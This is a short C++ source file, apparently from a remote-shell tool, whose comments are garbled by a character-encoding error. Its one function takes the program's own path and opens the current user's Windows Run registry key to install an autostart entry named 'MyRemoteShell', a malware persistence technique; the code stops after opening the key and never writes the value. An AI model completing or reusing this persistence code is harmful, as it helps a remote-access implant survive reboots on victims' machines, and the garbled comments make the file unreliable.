// ���������J�j�Y���̃R�}���h
#include "Persistence.h"

// Run���W�X�g���L�[�Ŏ��������J�j�Y��
void RunRegistry(std::vector<std::string>& tokens) {
    HKEY hKey;
    LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName = L"MyRemoteShell";

    // ���s�\�t�@�C���̃p�X���擾
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // ���W�X�g���L�[���J��
    RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);
    
}